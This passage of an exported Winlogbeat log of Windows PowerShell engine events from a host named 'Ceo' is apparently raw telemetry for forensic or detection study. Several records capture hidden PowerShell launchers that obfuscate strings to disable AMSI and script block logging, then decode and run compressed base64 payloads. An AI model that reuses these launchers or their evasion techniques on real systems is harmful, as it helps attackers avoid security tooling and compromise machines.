rIsD1KZsORbQyHt{2}FG{1}9+urQMt1A4mlzgyJuMWna0uzyOY2+vu8ETTOz2ffOezNQB3zBEOz0EmNFteFICM9R4Z7wc8a+GlwZEBMvbsGh1H05XtMNi/GLU4GrPBJUans42tac2p00FdnU+OQzQEcRwaQ4yyG+u7pTXHPvcnHwbTQBtfsn3NM{2}dOdCnvrK1i+X/dtU68WXPtne13DP3ajGnMrlq+djD6ZCTrk9C5Cf3hZP/8drC5gnNHmjZ+B4yZj2gi2q1FZXkmi+rbN5V103nAmZc6Rh+n'+'WYQZcAmaQZnUNk/tXX13OJUa'+'qgrvgyVJE8KgqULbLTMBMcY92Vq2fQD62rbbyOY36hUuPTeqKXeCtfuuUy4dHs7ASVnJJPMbpyQJRVTXb9u6Du1Cv9U7RSK9/m4mX23UrbW67DgSnDvzrDAPF'+'mmgqOrvBgyeFQIK3C8gewk9OH{2}JBQkq5LZMSAwNztlDBLcXuyPDI/wAuCbcfS7fF'+'EAT0N8j10pFyIb7sIFXQn/1O5mzK3UR/Pj/ypz7tV/sv{2}pNer0A58nq44UHXeK3ATDBVICcCwWbke0r4gUcdsnyIL4QG0iEYPfJl/VZLvYG8F{2}rusbfFiqfHM8LAAA{0}')-f'=','x','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=05fef7ed-5d70-40de-8154-d578f06b2d77
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=216eacfd-66c9-4b27-88d7-9c271df3172c
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c If($PSVersionTable.PSVersion.Major -ge 3){ $yGgS=[Collections.Generic.Dictionary[string,System.Object]]::new(); $lMW9_=[Ref].Assembly.GetType((('S{1}s'+'tem.{2}ana{3'+'}ement.'+'{0}utomati'+'on.{4}t'+'i'+'{5'+'}s')-f'A','y','M','g','U','l')); $cP=$lMW9_.GetField('cachedGroupPolicySettings','NonPublic,Static'); $wO=(('Ena{2'+'}l{'+'3}Scrip{1}{0}lockL'+'o'+'ggi'+'ng')-f'B','t','b','e'); $ov7er=(('{'+'1'+'}nabl{5}{4}c{3'+'}i'+'pt{2}lockIn{0}ocat'+'ion'+'Log'+'ging')-f'v','E','B','r','S','e'); $h8Kp=[Ref].Assembly.GetType(((''+'{2}{6'+'}'+'s'+'t{9}m.{4}'+'ana{'+'5}{'+'9'+'}m{9'+'}n'+'t.'+'{7}{1}'+'t{'+'8'+'}ma'+'ti{'+'8}'+'n.{7}'+'msi{0}t'+'i{3}s'+'')-f'U','u','S','l','M','g','y','A','o','e')); if ($h8Kp) { $h8Kp.GetField(((''+'a{0'+'}'+'s'+'i'+'{'+'1}ni{3}Fail{2}{'+'4'+'}')-f'm','I','e','t','d'),'NonPublic,Static').SetValue($null,$true); }; $pIb5E=(('{1'+'}cr'+'ip{0}B'+'l'+'ock{2}ogging')-f't','S','L'); If ($cP) { $o9m3=$cP.GetValue($null); $yGgS.Add($wO,0); $yGgS.Add($ov7er,0); $o9m3['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$pIb5E]=$yGgS; If($o9m3[$pIb5E]){ $o9m3[$pIb5E][$wO]=0; $o9m3[$pIb5E][$ov7er]=0; } } Else { [Ref].Assembly.GetType((('S{5}{2}t'+'em'+'.{1}anage'+'ment.{0}{3}to'+'mation.Sc'+'r'+'ip'+'t{'+'4}lock')-f'A','M','s','u','B','y')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAEvJ'+'VGMCA7VWbW/aSBD+Xqn/waqQMCrB5qVNE6nSre04'+'0ARi4gABik4be21vWXuJvQ6hvf73mzU4L5eklzuplhL2ZWZ29plnZjbIE09Qnig8V'+'368faPsPgenOFbUypJby7pSCY1Z7X6zcmsqn{1}V1jlYri8eYJ{2}vDQzNPU5KI7b'+'{1}{1}TATKMhJfMU{2}ytab8pUwikpK9s6tv{1}BPKD6XyZ+OY8SvMdmIbE3sRUfZQ4su9U+5h6VXDXTEq1OrXr9XafK+5aB{1}d55hlatXdZILEDZ+{1}ak35WZMHXm{1}WRK32qZfyjAeiMaFJu9UYJRkOyACs3ZA+ERH3sypc5f4yKRF5msg7SSNbEbUKQyfl'+'HvL9lGRZta7Mpfn5YvGHOt+dfZ4ngsak0UsESfnKJekN9UjW6OLEZ+ScBAvQc'+'kVKk3BRq4HYDV8StZLkjN'+'WV/2JGHZB1id{1}rldSHSiDliLRWh3g+uWWf+'+'zkjW73qM24WDKjBt2MBYPdTwheUvFlR{2}71+hjr3C+U3L3YIeKw6PKOF9mdFryt9OB0Lnm5gWrlIc'+'1Jb3OGtVPj{2}Q6/+WmvNUh'+'UU8wAW5mNO/cW9+qPYV0jkzaTQy0y2SEATYm0SHFOvJKv6XEhIwEgBSaMUG4B/anW3QXyLMB'+'JiIWGWzHiidhRTcad'+'r5JT5JEUehDUDryDitcfObCOnVntJn8QA3nYOVK0EkCKklN6l{1}aY8Xc5BqG{2}ynGV1{1}ckhR7264hLMiF9XUJLR3RbKBS+G'+'1Xt3+zkT1MOZKM0tav+Ac3esyZNMpLkHYQUILtwV8ShmEpG60qU+MTYuDcvjq8/iYWLGIHnA0g3EA1YkDq6QZEnB04IYtYZLRC9eMRKDTFEzbIZDqBC7FCnYhUPiV19wtMyFLfElMiUkD9yEcLuMi7{2}y'+'pqmACiRRz{2}P/5cPTylM4Y6ZkF{1}y1TLG5sREyBS{2}BJRhJmu4wKhBJBaBhpzw2cEY+draFRn2nnVEHwTe1uu6sJ9{1}+L2G02evD38ja90++fOtqtN3jfc/MnGP7E6LrcO19GiDP/+KTA3fcEe5RT5gO6g6pbnQiz9AvinE4pc0wHKHuReQ{1}3bG6mjvNdLruTqStrQ2v0+le6qjd7py19SXAJ3WWyB/EdH17CmO{2}qGenRi8z9B47+mKeX01a9mzCul'+'rHj{2}IJz9yPU0vTtAMfW/0NQgb32/3NZfOcX3S92OgkXDswO0t0hJCZHI1tg59Mj'+'RQ52hiHK74+iZZmHJrIsD1KZsORbQyHt{2}FG{1}9+urQMt1A4mlzgyJuMWna0uzyOY2+vu8ETTOz2ffOezNQB3zBEOz0EmNFteFICM9R4Z7wc8a+GlwZEBMvbsGh1H05XtMNi/GLU4GrPBJUans42tac2p00FdnU+OQzQEcRwaQ4yyG+u7pTXHPvcnHwbTQBtfsn3NM{2}dOdCnvrK1i+X/dtU68WXPtne13DP3ajGnMrlq+djD6ZCTrk9C5Cf3hZP/8drC5gnNHmjZ+B4yZj2gi2q1FZXkmi+rbN5V103nAmZc6Rh+n'+'WYQZcAmaQZnUNk/tXX13OJUa'+'qgrvgyVJE8KgqULbLTMBMcY92Vq2fQD62rbbyOY36hUuPTeqKXeCtfuuUy4dHs7ASVnJJPMbpyQJRVTXb9u6Du1Cv9U7RSK9/m4mX23UrbW67DgSnDvzrDAPF'+'mmgqOrvBgyeFQIK3C8gewk9OH{2}JBQkq5LZMSAwNztlDBLcXuyPDI/wAuCbcfS7fF'+'EAT0N8j10pFyIb7sIFXQn/1O5mzK3UR/Pj/ypz7tV/sv{2}pNer0A58nq44UHXeK3ATDBVICcCwWbke0r4gUcdsnyIL4QG0iEYPfJl/VZLvYG8F{2}rusbfFiqfHM8LAAA{0}')-f'=','x','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=05fef7ed-5d70-40de-8154-d578f06b2d77
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6220,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:12:31.086",Q3kdBIQByII7dpeEejfu,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:12:31.829","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=3a5739b2-2516-4baa-b0b9-f216a7c637f5
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $z2y=(('{2}n'+'a'+'{1}l'+'{5}Scri'+'ptBlock{4'+'}n{3}oc'+'at'+'ion{0}ogging')-f'L','b','E','v','I','e'); $tVuu=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $rU=(('{2}cr'+'ipt{'+'1}lockLo'+'ggi{0}g'+'')-f'n','B','S'); $iKY_=(('En'+'able{2}c'+'{1}ip{0}'+'Bloc{'+'3}Loggin'+'g')-f't','r','S','k'); $uFKV=[Ref].Assembly.GetType((('{5}{4}{9}t'+'e'+'m.{'+'1}'+'a'+'na'+'{2}'+'em'+'ent'+'.'+'{8}'+'{0'+'}t{7}mati{7'+'}n.{8}'+'m'+'{9}i'+'{6'+'}ti'+'{3}'+'{9'+'}')-f'u','M','g','l','y','S','U','o','A','s')); $ezY=[Ref].Assembly.GetType((('{3'+'}{1}st'+'em.'+'{2'+'}ana{'+'0}ement.A{4}tom'+'ation.{5}til'+'s')-f'g','y','M','S','u','U')); $lYez_=$ezY.GetField('cachedGroupPolicySettings','NonPublic,Static'); if ($uFKV) { $uFKV.GetField((('a{3}si'+'{4}{'+'0}'+'i'+'{1'+'}Fai'+'{2'+'}ed'+'')-f'n','t','l','m','I'),'NonPublic,Static').SetValue($null,$true); }; If ($lYez_) { $fSI=$lYez_.GetValue($null); If($fSI[$rU]){ $fSI[$rU][$z2y]=0; $fSI[$rU][$iKY_]=0; } $tVuu.Add($iKY_,0); $tVuu.Add($z2y,0); $fSI['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$rU]=$tVuu; } Else { [Ref].Assembly.GetType(((''+'Sy{5}'+'tem.{2}ana'+'{3}ement.A'+'{'+'0}tomation'+'.Script{4'+'}loc{1'+'}')-f'u','k','M','g','B','s')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAHrJVGMCA7VWbW/aSBD+Xq{1}/waqQsFWCzcslTaRKtzYx{2}ARiIECAotPGXuwN'+'ay+x1yFur//9ZrHJi5r2c'+'ifVEsm+zMzOPvPMzK7SyBWUR8p6qHx7/04pPgfHOFTU0tqe3Y0qSomNhfa0W8r85qHyWVEXaLNp8RDTaHlyYqVxTCKRz6ttIlCS{2}PCGUZKomvK3Mg1ITA4ub26JK5RvSumvapvxG8wKsczCb{2}CUAxR5cu+Cu1g6Vh1tGBVq+cuXsrY4qC2rp3cpZolaHmWJIGHVY6ysKd81eeBVtiFquUfdmCd8JapTGjXq1XGU4BXpg7V70iMi4F5Shss8XScmIo2j/FbSTC6{2}lmHoxNxF{1}heTJClXlIU8YLFc/q{2}uitOHaSRoSKrdSJCYb0Y{2}vqcuSaodHHmMDMlqCVojEdPIX2oaiN3zNVFLUcpYRf{2}vZtQ+2e6xe6uS+l'+'wJpBwRaxUI6iv37HEvZSTXLL/iaE4EDb6CDADgd4{1}h6pE/h5gev0Khp4X9t9jtEHBadX'+'hCd9qfFaOi9OB4LHicwbR0FadEWz5CrpTcQVp5q7HaXhP02M0aVhYTTr3l{2}/4LAp'+'QeM{1}{1}mL9jcIisa{2}VYW4ZC6e8KqrwWFrBjZIVLdi/XBP7VcbBCvRRjxsZAwS278oHYaUvGoa6aUeSRGLgQ2Aa8g5tpLZ/LIqeVu1CMhYJfPgaylFaQJ2U'+'sXqZHtT5dzECpbDCdJRXFSyFO3oowIZsSrKChKaLGFUsF3w'+'/KTu72UCeriROzNLbWXaBa{1}WjxKRJy6EFRA4Gq0IS7FTAJSUTr'+'UI2Y2ov7+9PKrcFiYMcgesHQP4YAVCcNISKrE4Ki{2}hVYdEdENN4yEILKrGjbDPtSII{2}V21MI+8cqvu7lPhJz1EpY9Hs+chFiPGBcV'+'ZUJjASVIQgzc+j8u/Fh6pC9WTIrAqPvsWpiZ{2}OwvfT2N22NJ0QKgHRyxACjsmIcmTshhMy8z6gf9{2'+'}joIvl{2}3Yj3vbE1r3S38evAb00aXt46887Pbjt5zrcRp258Q3fpb91Mfud6'+'ZR45HIDeYNIXloM6AGmYzcE3jajf2Z+OumHVR5ypwmeGchhf9bvKgbztTaSu34Tab{1}WsDNRrNy4axBvR'+'mtOav{2}dcP6fbhAsZQTy8vzG5iGl12emYNb6Z1ez5lHb1pB6spT0aHs5au68cebvUyhEzuNXrZdW3IrzpuaDYjrh9bzTU6RciKTie2yc9{1}ZowcfYL9Dd+eB2'+'sr9C1{2}2i4l88HYNgcD20Tj9u1d61j39ePpNQ7M6aRO55vrYQBze9sZ{1}OtGs+uRr3y+BeDaHGF/CDK+VXeDFci0PiL'+'zY58{1}dbw2OTJBxp7foXYw29gOg/2rcZ2jCetfY3Qxz2xdr82cJuoYfNr20QDEsW8OMEruW19bem3icW/6R3+20ifX7EhvWQM{1}uJZ31jeh/Lvt'+'tM7deW3rXh41TePOCm{1}Ibuqefjz+ZEbbc9+5973B9Gj40M9u4Nyxr{2}8+AGMWYxqJR{1}1Zwqmsp+/flTL7GWV+1i56OE4CzIBK0Af2+Wzz2C4qu8Op1FBVeCGsSRwRBj0Vuu4+DxBj3JV9Je8A0NTyViM737i78'+'+i1{2}aY8CmpPDWe/dHIyBycht3bEr16QyBdBxXhoGAY0CuPBaO7S6O13s/gmU3NrFdlrAJtH62x{1}HQzSlaKqvxsveFIIqG2/QOx{1}4MHRa6hGUBzzIiEhNDl{1}zwHc3euRCS/QA9hqcPOFfE4AR0D9gNwpJSEb7fPGXRLid9KmKHMB/PP+lTZPa7/YfROVjIqE5ofFlwvP2sNvu/'+'8UUwF'+'y'+'I6jVjOSPh5/AUCTKs+'+'AKATmwKj75pr5MxUEf3mi7fvEPyeWdCswLAAA{0}')-f'=','n','k')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=e3e1f17c-d975-4b7c-b56a-47181a2bcf14
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=3a5739b2-2516-4baa-b0b9-f216a7c637f5
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $z2y=(('{2}n'+'a'+'{1}l'+'{5}Scri'+'ptBlock{4'+'}n{3}oc'+'at'+'ion{0}ogging')-f'L','b','E','v','I','e'); $tVuu=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $rU=(('{2}cr'+'ipt{'+'1}lockLo'+'ggi{0}g'+'')-f'n','B','S'); $iKY_=(('En'+'able{2}c'+'{1}ip{0}'+'Bloc{'+'3}Loggin'+'g')-f't','r','S','k'); $uFKV=[Ref].Assembly.GetType((('{5}{4}{9}t'+'e'+'m.{'+'1}'+'a'+'na'+'{2}'+'em'+'ent'+'.'+'{8}'+'{0'+'}t{7}mati{7'+'}n.{8}'+'m'+'{9}i'+'{6'+'}ti'+'{3}'+'{9'+'}')-f'u','M','g','l','y','S','U','o','A','s')); $ezY=[Ref].Assembly.GetType((('{3'+'}{1}st'+'em.'+'{2'+'}ana{'+'0}ement.A{4}tom'+'ation.{5}til'+'s')-f'g','y','M','S','u','U')); $lYez_=$ezY.GetField('cachedGroupPolicySettings','NonPublic,Static'); if ($uFKV) { $uFKV.GetField((('a{3}si'+'{4}{'+'0}'+'i'+'{1'+'}Fai'+'{2'+'}ed'+'')-f'n','t','l','m','I'),'NonPublic,Static').SetValue($null,$true); }; If ($lYez_) { $fSI=$lYez_.GetValue($null); If($fSI[$rU]){ $fSI[$rU][$z2y]=0; $fSI[$rU][$iKY_]=0; } $tVuu.Add($iKY_,0); $tVuu.Add($z2y,0); $fSI['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$rU]=$tVuu; } Else { [Ref].Assembly.GetType(((''+'Sy{5}'+'tem.{2}ana'+'{3}ement.A'+'{'+'0}tomation'+'.Script{4'+'}loc{1'+'}')-f'u','k','M','g','B','s')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAHrJVGMCA7VWbW/aSBD+Xq{1}/waqQsFWCzcslTaRKtzYx{2}ARiIECAotPGXuwN'+'ay+x1yFur//9ZrHJi5r2c'+'ifVEsm+zMzOPvPMzK7SyBWUR8p6qHx7/04pPgfHOFTU0tqe3Y0qSomNhfa0W8r85qHyWVEXaLNp8RDTaHlyYqVxTCKRz6ttIlCS{2}PCGUZKomvK3Mg1ITA4ub26JK5RvSumvapvxG8wKsczCb{2}CUAxR5cu+Cu1g6Vh1tGBVq+cuXsrY4qC2rp3cpZolaHmWJIGHVY6ysKd81eeBVtiFquUfdmCd8JapTGjXq1XGU4BXpg7V70iMi4F5Shss8XScmIo2j/FbSTC6{2}lmHoxNxF{1}heTJClXlIU8YLFc/q{2}uitOHaSRoSKrdSJCYb0Y{2}vqcuSaodHHmMDMlqCVojEdPIX2oaiN3zNVFLUcpYRf{2}vZtQ+2e6xe6uS+l'+'wJpBwRaxUI6iv37HEvZSTXLL/iaE4EDb6CDADgd4{1}h6pE/h5gev0Khp4X9t9jtEHBadX'+'hCd9qfFaOi9OB4LHicwbR0FadEWz5CrpTcQVp5q7HaXhP02M0aVhYTTr3l{2}/4LAp'+'QeM{1}{1}mL9jcIisa{2}VYW4ZC6e8KqrwWFrBjZIVLdi/XBP7VcbBCvRRjxsZAwS278oHYaUvGoa6aUeSRGLgQ2Aa8g5tpLZ/LIqeVu1CMhYJfPgaylFaQJ2U'+'sXqZHtT5dzECpbDCdJRXFSyFO3oowIZsSrKChKaLGFUsF3w'+'/KTu72UCeriROzNLbWXaBa{1}WjxKRJy6EFRA4Gq0IS7FTAJSUTr'+'UI2Y2ov7+9PKrcFiYMcgesHQP4YAVCcNISKrE4Ki{2}hVYdEdENN4yEILKrGjbDPtSII{2}V21MI+8cqvu7lPhJz1EpY9Hs+chFiPGBcV'+'ZUJjASVIQgzc+j8u/Fh6pC9WTIrAqPvsWpiZ{2}OwvfT2N22NJ0QKgHRyxACjsmIcmTshhMy8z6gf9{2'+'}joIvl{2}3Yj3vbE1r3S38evAb00aXt46887Pbjt5zrcRp258Q3fpb91Mfud6'+'ZR45HIDeYNIXloM6AGmYzcE3jajf2Z+OumHVR5ypwmeGchhf9bvKgbztTaSu34Tab{1}WsDNRrNy4axBvR'+'mtOav{2}dcP6fbhAsZQTy8vzG5iGl12emYNb6Z1ez5lHb1pB6spT0aHs5au68cebvUyhEzuNXrZdW3IrzpuaDYjrh9bzTU6RciKTie2yc9{1}ZowcfYL9Dd+eB2'+'sr9C1{2}2i4l88HYNgcD20Tj9u1d61j39ePpNQ7M6aRO55vrYQBze9sZ{1}OtGs+uRr3y+BeDaHGF/CDK+VXeDFci0PiL'+'zY58{1}dbw2OTJBxp7foXYw29gOg/2rcZ2jCetfY3Qxz2xdr82cJuoYfNr20QDEsW8OMEruW19bem3icW/6R3+20ifX7EhvWQM{1}uJZ31jeh/Lvt'+'tM7deW3rXh41TePOCm{1}Ibuqefjz+ZEbbc9+5973B9Gj40M9u4Nyxr{2}8+AGMWYxqJR{1}1Zwqmsp+/flTL7GWV+1i56OE4CzIBK0Af2+Wzz2C4qu8Op1FBVeCGsSRwRBj0Vuu4+DxBj3JV9Je8A0NTyViM737i78'+'+i1{2}aY8CmpPDWe/dHIyBycht3bEr16QyBdBxXhoGAY0CuPBaO7S6O13s/gmU3NrFdlrAJtH62x{1}HQzSlaKqvxsveFIIqG2/QOx{1}4MHRa6hGUBzzIiEhNDl{1}zwHc3euRCS/QA9hqcPOFfE4AR0D9gNwpJSEb7fPGXRLid9KmKHMB/PP+lTZPa7/YfROVjIqE5ofFlwvP2sNvu/'+'8UUwF'+'y'+'I6jVjOSPh5/AUCTKs+'+'AKATmwKj75pr5MxUEf3mi7fvEPyeWdCswLAAA{0}')-f'=','n','k')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=5.1.19041.1682
	RunspaceId=e3e1f17c-d975-4b7c-b56a-47181a2bcf14
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4635,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:12:26.866","_3kdBIQByII7dpeEazYg",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:12:27.779","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=a4a47c1d-0ad6-4ac9-a866-38d815d7e393
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b13f65e0-0de1-45c1-8717-0c8975422104
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=a4a47c1d-0ad6-4ac9-a866-38d815d7e393
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4634,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:12:12.242",v3kdBIQByII7dpeELzYn,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 17:12:12.434","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:59:12Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T12:59:12Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",3917,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:11:47.053",9nkcBIQByII7dpeEzDVk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:11:47.163","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=1dd2fe6d-e183-4f78-a4ba-2ad6f9631d81
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=1dd2fe6d-e183-4f78-a4ba-2ad6f9631d81
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4633,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:11:46.976",9XkcBIQByII7dpeEzDVk,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:11:47.163","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=16

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
